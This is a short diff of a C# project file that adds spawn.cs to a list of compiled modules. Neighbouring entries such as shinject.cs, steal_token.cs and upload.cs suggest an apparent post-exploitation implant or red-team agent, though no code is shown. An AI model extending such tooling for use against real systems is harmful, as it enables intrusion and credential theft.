@@ -88,6 +88,7 @@
     <Compile Include="shell.cs" />
     <Compile Include="shinject.cs" />
     <Compile Include="sleep.cs" />
+    <Compile Include="spawn.cs" />
     <Compile Include="steal_token.cs" />
     <Compile Include="upload.cs" />
     <Compile Include="whoami.cs" />
